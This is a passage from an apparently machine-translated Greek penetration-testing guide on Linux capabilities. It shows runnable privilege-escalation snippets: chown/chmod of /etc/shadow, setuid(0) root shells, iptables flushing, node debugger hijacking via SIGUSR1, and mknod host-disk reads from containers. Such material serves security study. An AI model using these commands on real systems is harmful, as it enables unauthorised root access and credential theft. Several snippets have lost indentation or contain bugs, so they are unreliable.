python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ή με το δυαδικό αρχείο **`ruby`** να έχει αυτήν τη δυνατότητα:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Αυτό σημαίνει ότι είναι δυνατή η αλλαγή των δικαιωμάτων οποιουδήποτε αρχείου.**

**Παράδειγμα με δυαδικό αρχείο**

Αν ο Python έχει αυτήν τη δυνατότητα, μπορείτε να τροποποιήσετε τα δικαιώματα του αρχείου shadow, **να αλλάξετε τον κωδικό root** και να αναβαθμίσετε τα δικαιώματα:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Αυτό σημαίνει ότι είναι δυνατόν να οριστεί ο αποτελεσματικός αναγνωριστικός χρήστης της διεργασίας που δημιουργείται.**

**Παράδειγμα με δυαδικό αρχείο**

Εάν η python έχει αυτήν τη **δυνατότητα**, μπορείτε πολύ εύκολα να την καταχραστείτε για να αναβαθμίσετε τα δικαιώματα σε root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Άλλος τρόπος:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Αυτό σημαίνει ότι είναι δυνατόν να οριστεί η αποτελεσματική ταυτότητα ομάδας της διεργασίας που δημιουργείται.**

Υπάρχουν πολλά αρχεία που μπορείτε να **αντικαταστήσετε για να αναβαθμίσετε τα δικαιώματα,** [**μπορείτε να πάρετε ιδέες από εδώ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με δυαδικό αρχείο**

Σε αυτήν την περίπτωση, θα πρέπει να αναζητήσετε ενδιαφέροντα αρχεία που μια ομάδα μπορεί να διαβάσει, επειδή μπορείτε να προσωποποιήσετε οποιαδήποτε ομάδα:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Αφού βρείτε ένα αρχείο που μπορείτε να καταχραστείτε (διαβάζοντας ή γράφοντας) για να αναβαθμίσετε τα δικαιώματα, μπορείτε να **πάρετε ένα κέλυφος προσωποποιώντας την ενδιαφέρουσα ομάδα** με:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Σε αυτήν την περίπτωση, η ομάδα shadow προσποιήθηκε, έτσι ώστε να μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:
```bash
cat /etc/shadow
```
Αν είναι εγκατεστημένο το **docker**, μπορείτε να **προσομοιώσετε** την ομάδα **docker** και να την καταχραστείτε για να επικοινωνήσετε με το [**docker socket** και να αναβαθμίσετε τα δικαιώματα](./#writable-docker-socket).

## CAP\_SETFCAP

**Αυτό σημαίνει ότι είναι δυνατόν να ορίσετε δυνατότητες σε αρχεία και διεργασίες**

**Παράδειγμα με δυαδικό αρχείο**

Αν ο Python έχει αυτήν τη **δυνατότητα**, μπορείτε πολύ εύκολα να την καταχραστείτε για να αναβαθμίσετε τα δικαιώματα σε root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Σημείωση ότι αν ορίσετε μια νέα δυνατότητα στο δυαδικό αρχείο με το CAP\_SETFCAP, θα χάσετε αυτήν τη δυνατότητα.
{% endhint %}

Αφού αποκτήσετε τη δυνατότητα [SETUID](linux-capabilities.md#cap\_setuid), μπορείτε να μεταβείτε στην ενότητά της για να δείτε πώς να αναβαθμίσετε τα δικαιώματα.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Από προεπιλογή, η δυνατότητα **CAP\_SETFCAP δίνεται στη διεργασία μέσα στον εμπορευματοκιβώτιο του Docker**. Μπορείτε να ελέγξετε αυτό κάνοντας κάτι όπως:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Αυτή η δυνατότητα επιτρέπει να **δοθεί οποιαδήποτε άλλη δυνατότητα σε δυαδικά αρχεία**, οπότε μπορούμε να σκεφτούμε να **δραπετεύσουμε** από τον εμποδίζοντα δοχείο **καταχρώντας οποιαδήποτε άλλη δυνατότητα που αναφέρεται σε αυτήν τη σελίδα**.\
Ωστόσο, αν προσπαθήσετε να δώσετε, για παράδειγμα, τις δυνατότητες CAP\_SYS\_ADMIN και CAP\_SYS\_PTRACE στο δυαδικό αρχείο gdb, θα διαπιστώσετε ότι μπορείτε να τις δώσετε, αλλά το **δυαδικό αρχείο δεν θα μπορεί να εκτελεστεί μετά από αυτό**.
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Από τα έγγραφα](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Επιτρεπόμενες: Αυτό είναι ένα **περιοριστικό υπερσύνολο για τις αποτελεσματικές δυνατότητες** που μπορεί να υιοθετήσει ο νήμα. Είναι επίσης ένα περιοριστικό υπερσύνολο για τις δυνατότητες που μπορούν να προστεθούν στο σύνολο κληρονομήσιμων από ένα νήμα που **δεν έχει τη δυνατότητα CAP\_SETPCAP** στο αποτελεσματικό του σύνολο._\
Φαίνεται ότι οι επιτρεπόμενες δυνατότητες περιορίζουν αυτές που μπορούν να χρησιμοποιηθούν.\
Ωστόσο, το Docker παρέχει επίσης τη δυνατότητα **CAP\_SETPCAP** από προεπιλογή, οπότε μπορείτε να **ορίσετε νέες δυνατότητες μέσα στο σύνολο κληρονομήσιμων**.\
Ωστόσο, στην τεκμηρίωση αυτής της δυνατότητας: _CAP\_SETPCAP: \[…] **προσθέτει οποιαδήποτε δυνατότητα από το σύνολο περιορισμού του κλήσης νήματος** στο κληρονομήσιμο σύνολο του_.\
Φαίνεται ότι μπορούμε να προσθέσουμε μόνο στο σύνολο κληρονομήσιμων δυνατοτήτων από το σύνολο περιορισμού. Αυτό σημαίνει ότι **δεν μπορούμε να προσθέσουμε νέες δυνατότητες όπως CAP\_SYS\_ADMIN ή CAP\_SYS\_PTRACE στο σύνολο κληρονομήσιμων για να αναβαθμίσουμε τα δικαιώματα**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει μια σειρά από ευαίσθητες λειτουργίες, συμπεριλαμβανομένης της πρόσβασης στο `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίησης του `mmap_min_addr`, πρόσβασης στις κλήσεις συστήματος `ioperm(2)` και `iopl(2)`, καθώς και διάφορες εντολές δίσκου. Το `FIBMAP ioctl(2)` είναι επίσης ενεργοποιημένο μέσω αυτής της δυνατότητας, πράγμα που έχει προκαλέσει προβλήματα στο [παρελθόν](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη σελίδα του εγχειριδίου, αυτό επιτρέπει επίσης στον κάτοχο να **εκτελεί περιγραφικά μια σειρά λειτουργιών που αφορούν συσκευές**.

Αυτό μπορεί να είναι χρήσιμο για **ανέλιξη δικαιωμάτων** και **απόδραση από το Docker**.

## CAP\_KILL

**Αυτό σημαίνει ότι είναι δυνατό να τερματιστεί οποιαδήποτε διεργασία.**

**Παράδειγμα με δυαδικό αρχείο**

Ας υποθέσουμε ότι το δυαδικό αρχείο **`python`** έχει αυτή τη δυνατότητα. Εάν μπορούσατε επίσης να **τροποποιήσετε κάποια ρύθμιση υπηρεσίας ή ρυθμίσεις socket** (ή οποιοδήποτε αρχείο ρυθμίσεων που σχετίζεται με μια υπηρεσία), θα μπορούσατε να τοποθετήσετε μια παρασκηνιακή πόρτα και στη συνέχεια να τερματίσετε τη διεργασία που σχετίζεται με αυτήν την υπηρεσία και να περιμένετε να εκτελεστεί το νέο αρχείο ρυθμίσεων με την παρασκηνιακή σας πόρτα.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Ανόδου Προνομίων με τη χρήση της εντολής kill**

Εάν έχετε τις δυνατότητες της εντολής kill και υπάρχει ένα πρόγραμμα **node που τρέχει ως root** (ή ως διαφορετικός χρήστης), μπορείτε πιθανώς να του **στείλετε** το **σήμα SIGUSR1** και να το κάνετε να **ανοίξει τον αποσφαλματωτή του node**, όπου μπορείτε να συνδεθείτε.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή να προωθήσει την τεχνική γνώση**, αυτό το συνέδριο είναι ένας ζωντανός συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Αυτό σημαίνει ότι είναι δυνατόν να ακούτε σε οποιαδήποτε θύρα (ακόμα και σε προνομιούχες).** Δεν μπορείτε να αναβαθμίσετε δικαιώματα απευθείας με αυτήν την ικανότητα.

**Παράδειγμα με δυαδικό**

Αν η **`python`** έχει αυτήν την ικανότητα, θα μπορεί να ακούει σε οποιαδήποτε θύρα και ακόμα να συνδεθεί από αυτήν σε οποιαδήποτε άλλη θύρα (ορισμένες υπηρεσίες απαιτούν συνδέσεις από συγκεκριμένες προνομιούχες θύρες)

{% tabs %}
{% tab title="Ακρόαση" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Σύνδεση" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

Η δυνατότητα [**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει στις διεργασίες να **δημιουργούν RAW και PACKET sockets**, επιτρέποντάς τους να δημιουργούν και να στέλνουν αυθαίρετα πακέτα δικτύου. Αυτό μπορεί να οδηγήσει σε κινδύνους ασφαλείας σε περιβάλλοντα εντοπισμένα σε εμπορευματοκιβώτια, όπως παραποίηση πακέτων, εισαγωγή κίνησης και παράκαμψη ελέγχων πρόσβασης στο δίκτυο. Κακόβουλοι δράστες μπορούν να εκμεταλλευτούν αυτό για να παρεμβάλουν στη δρομολόγηση των εμπορευματοκιβωτίων ή να διακινδυνεύσουν την ασφάλεια του δικτύου του οικοδεσπότη, ιδίως χωρίς επαρκείς προστασίες της προστατευτικής πυραμίδας. Επιπλέον, η **CAP_NET_RAW** είναι ζωτικής σημασίας για προνομιούχα εμπορευματοκιβώτια για να υποστηρίξουν λειτουργίες όπως το ping μέσω αιτημάτων RAW ICMP.

**Αυτό σημαίνει ότι είναι δυνατή η καταγραφή της κίνησης του δικτύου.** Δεν μπορείτε να αναβαθμίσετε απευθείας τα δικαιώματα με αυτήν τη δυνατότητα.

**Παράδειγμα με δυαδικό αρχείο**

Εάν το δυαδικό αρχείο **`tcpdump`** έχει αυτήν τη δυνατότητα, θα μπορείτε να το χρησιμοποιήσετε για να καταγράψετε πληροφορίες δικτύου.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Σημείωση ότι αν το **περιβάλλον** παρέχει αυτή τη δυνατότητα, μπορείτε επίσης να χρησιμοποιήσετε το **`tcpdump`** για να καταγράψετε την κίνηση.

**Παράδειγμα με το δυαδικό 2**

Το παρακάτω παράδειγμα είναι κώδικας **`python2`** που μπορεί να είναι χρήσιμος για την παρεμπόδιση της κίνησης της διεπαφής "**lo**" (**localhost**). Ο κώδικας προέρχεται από το εργαστήριο "_The Basics: CAP-NET\_BIND + NET\_RAW_" από το [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

Η δυνατότητα [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει στον κάτοχό τη δυνατότητα να **τροποποιεί τις ρυθμίσεις δικτύου**, συμπεριλαμβανομένων των ρυθμίσεων του τείχους προστασίας, των πινάκων δρομολόγησης, των δικαιωμάτων socket και των ρυθμίσεων της διεπαφής δικτύου εντός των εκτεθειμένων αρθρωμάτων δικτύου. Επίσης, επιτρέπει την ενεργοποίηση της **λειτουργίας προσκόλλησης** στις διεπαφές δικτύου, επιτρέποντας την καταγραφή πακέτων σε διαφορετικά αρθρώματα δικτύου.

**Παράδειγμα με δυαδικό αρχείο**

Ας υποθέσουμε ότι το **δυαδικό αρχείο python** έχει αυτές τις δυνατότητες.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Αυτό σημαίνει ότι είναι δυνατή η τροποποίηση των χαρακτηριστικών του inode.** Δεν μπορείτε να αναβαθμίσετε απευθείας τα δικαιώματα με αυτήν την ικανότητα.

**Παράδειγμα με δυαδικό αρχείο**

Εάν ανακαλύψετε ότι ένα αρχείο είναι αμετάβλητο και η python έχει αυτήν την ικανότητα, μπορείτε **να αφαιρέσετε το αμετάβλητο χαρακτηριστικό και να καταστήσετε το αρχείο τροποποιήσιμο:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Σημείωση ότι συνήθως αυτή η ανεπανόρθωτη ιδιότητα ορίζεται και αφαιρείται χρησιμοποιώντας:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση της κλήσης συστήματος `chroot(2)`, η οποία μπορεί να επιτρέψει τη διαφυγή από περιβάλλοντα `chroot(2)` μέσω γνωστών ευπαθειών:

* [Πώς να διαφύγετε από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: εργαλείο διαφυγής chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) όχι μόνο επιτρέπει την εκτέλεση της κλήσης συστήματος `reboot(2)` για επανεκκινήσεις του συστήματος, συμπεριλαμβανομένων συγκεκριμένων εντολών όπως `LINUX_REBOOT_CMD_RESTART2` που προσαρμόζονται για συγκεκριμένες πλατφόρμες υλικού, αλλά επιτρέπει επίσης τη χρήση των `kexec_load(2)` και, από το Linux 3.17 και μετά, `kexec_file_load(2)` για τη φόρτωση νέων ή υπογεγραμμένων πυρήνων κατάρρευσης αντίστοιχα.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) χωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, επιτρέποντας ειδικά τη χρήση της κλήσης `syslog(2)`. Αυτή η ικανότητα επιτρέπει την προβολή διευθύνσεων πυρήνα μέσω των διεπαφών `/proc` και παρόμοιων όταν η ρύθμιση `kptr_restrict` είναι 1, η οποία ελέγχει την αποκάλυψη των διευθύνσεων πυρήνα. Από το Linux 2.6.39, η προεπιλογή για το `kptr_restrict` είναι 0, πράγμα που σημαίνει ότι οι διευθύνσεις πυρήνα είναι ορατές, αν και πολλές διανομές το ορίζουν σε 1 (απόκρυψη διευθύνσεων εκτός από το uid 0) ή 2 (απόκρυψη διευθύνσεων πάντα) για λόγους ασφαλείας.

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στην έξοδο `dmesg` όταν η ρύθμιση `dmesg_restrict` ορίζεται σε 1. Παρά τις αλλαγές αυτές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης λειτουργιών `syslog` λόγω ιστορικών προηγούμενων.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα της κλήσης συστήματος `mknod` πέρα ​​από τη δημιουργία κανονικών αρχείων, FIFOs (ονομασμένα αγωγούς) ή UNIX domain sockets. Επιτρέπει ειδικά τη δημιουργία ειδικών αρχείων, τα οποία περιλαμβάνουν:

- **S_IFCHR**: Ειδικά αρχεία χαρακτήρων, που είναι συσκευές όπως τερματικά.
- **S_IFBLK**: Ειδικά αρχεία μπλοκ, που είναι συσκευές όπως δίσκοι.

Αυτή η ικανότητα είναι απαραίτητη για διεργασίες που απαιτούν τη δυνατότητα δημιουργίας αρχείων συσκευής, διευκολύνοντας την άμεση αλληλεπίδραση με το υλικό μέσω χαρακτήρων ή μπλοκ συσκευών.

Είναι μια προεπιλεγμένη ικανότητα του docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Αυτή η ικανότητα επιτρέπει την προνόμιας αύξηση (μέσω πλήρους ανάγνωσης δίσκου) στον κεντρικό υπολογιστή, υπό τις ακόλουθες συνθήκες:

1. Έχετε αρχική πρόσβαση στον κεντρικό υπολογιστή (Μη προνομιούχος).
2. Έχετε αρχική πρόσβαση στον εμπορευματοκιβώτιο (Προνομιούχος (EUID 0) και αποτελεσματική `CAP_MKNOD`).
3. Ο κεντρικός υπολογιστής και το εμπορευματοκιβώτιο πρέπει να μοιράζονται το ίδιο περιβάλλον χρήστη.

**Βήματα για τη Δημιουργία και Πρόσβαση σε Ένα Αρχείο Μπλοκ σε Ένα Εμπορευματοκιβώτιο:**

1. **Στον Κεντρικό Υπολογιστή ως Ένας Κανονικός Χρήστης:**
- Προσδιορίστε το τρέχον αναγνωριστικό χρήστη σας με την εντολή `id`, π.χ. `uid=1000(standarduser)`.
- Εντοπίστε τη στόχο συσκευή, για παράδειγμα, `/dev/sdb`.

2. **Μέσα στο Εμπορευματοκιβώτιο ως `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Επιστροφή στον Κεντρικό Υπολογιστή:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Αυτή η προσέγγιση επιτρέπει στον κανονικό χρήστη να έχει πρόσβαση και πιθανώς να διαβάσει δεδομένα από το `/dev/sdb` μέσω του container, εκμεταλλευόμενος τα κοινόχρηστα namespaces χρηστών και τις άδειες που έχουν οριστεί στη συσκευή.

### CAP_SETPCAP

Το **CAP_SETPCAP** επιτρέπει σε ένα διεργασία να **τροποποιήσει τα σύνολα δυνατοτήτων** μιας άλλης διεργασίας, επιτρέποντας την προσθήκη ή την αφαίρεση δυνατοτήτων από τα σύνολα των δυνατοτήτων που ισχύουν, κληρονομούνται και επιτρέπονται. Ωστόσο, μια διεργασία μπορεί να τροποποιήσει μόνο τις δυνατότητες που διαθέτει στο δικό της σύνολο των δυνατοτήτων που επιτρέπονται, εξασφαλίζοντας ότι δεν μπορεί να αυξήσει τα προνόμια μιας άλλης διεργασίας πέρα ​​από τα δικά της. Πρόσφατες ενημερώσεις του πυρήνα έχουν αυξήσει τους κανόνες αυτούς, περιορίζοντας το `CAP_SETPCAP` ώστε να μειώνει μόνο τις δυνατότητες στο δικό του ή στο σύνολο των δυνατοτήτων που επιτρέπονται στους απογόνους του, με σκοπό τη μείωση των κινδύνων ασφαλείας. Η χρήση απαιτεί την έχουσα `CAP_SETPCAP` στο σύνολο των δυνατοτήτων και τις στόχευες δυνατότητες στο επιτρεπόμενο σύνολο, χρησιμοποιώντας την `capset()` για τροποποιήσεις. Αυτό περιλαμβάνει την πυρήνα λειτουργία και των περιορισμών του `CAP_SETPCAP`, τονίζοντας τον ρόλο του στη διαχείριση προνομίων και την ενίσχυση της ασφάλειας.

Το **CAP_SETPCAP** είναι μια δυνατότητα του Linux που επιτρέπει σε μια διεργασία να **τροποποιήσει τα σύνολα δυνατοτήτων μιας άλλης διεργασίας**. Παρέχει τη δυνατότητα προσθήκης ή αφαίρεσης δυνατοτήτων από τα σύνολα των δυνατοτήτων που ισχύουν, κληρονομούνται και επιτρέπονται σε άλλες διεργασίες. Ωστόσο, υπάρχουν ορισμένοι περιορισμοί σχετικά με το πώς μπορεί να χρησιμοποιηθεί αυτή η δυνατότητα.

Μια διεργασία με το `CAP_SETPCAP` **μπορεί να παραχωρήσει ή να αφαιρέσει δυνατότητες που βρίσκονται στο δικό της επιτρεπόμενο σύνολο δυνατοτήτων**. Με άλλα λόγια, μια διεργασία δεν μπορεί να παραχωρήσει μια δυνατότητα σε μια άλλη διεργασία αν δεν διαθέτει αυτήν τη δυνατότητα η ίδια. Αυτός ο περιορισμός εμποδίζει μια διεργασία να αυξήσει τα προνόμια μιας άλλης διεργασίας πέρα ​​από το επίπεδο προνομίων της ίδιας.

Επιπλέον, σε πρόσφατες εκδόσεις του πυρήνα, η δυνατότητα `CAP_SETPCAP` έχει **περιοριστεί περαιτέρω**. Δεν επιτρέπει πλέον σε μια διεργασία να τροποποιήσει αυθαίρετα τα σύνολα δυνατοτήτων άλλων διεργασιών. Αντ' αυτού, επιτρέπει **μόνο σε μια διεργασία να μειώσει τις δυνατότητες στο δικό της επιτρεπόμενο σύνολο δυνατοτήτων ή στο επιτρεπόμενο σύνολο δυνατοτήτων των απογόνων της**. Αυτή η αλλαγή εισήχθη για να μειωθούν οι πιθανοί κίνδυνοι ασφαλείας που συνδέονται με τη δυνατότητα.

Για να χρησιμοποιήσετε το `CAP_SETPCAP` αποτελεσματικά, πρέπει να έχετε τη δυνατότητα στο επιτρεπόμενο σύνολο δυνατοτήτων και τις στόχευες δυνατότητες στο επιτρεπόμενο σύνολο δυνατοτήτων. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε την κλήση συστήματος `capset()` για να τροποποιήσετε τα σύνολα δυνατοτήτων άλλων διεργασιών.

Συνολικά, το `CAP_SETPCAP` επιτρέπει σε μια διεργασία να τροποποιήσει τα σύνολα δυνατοτήτων άλ
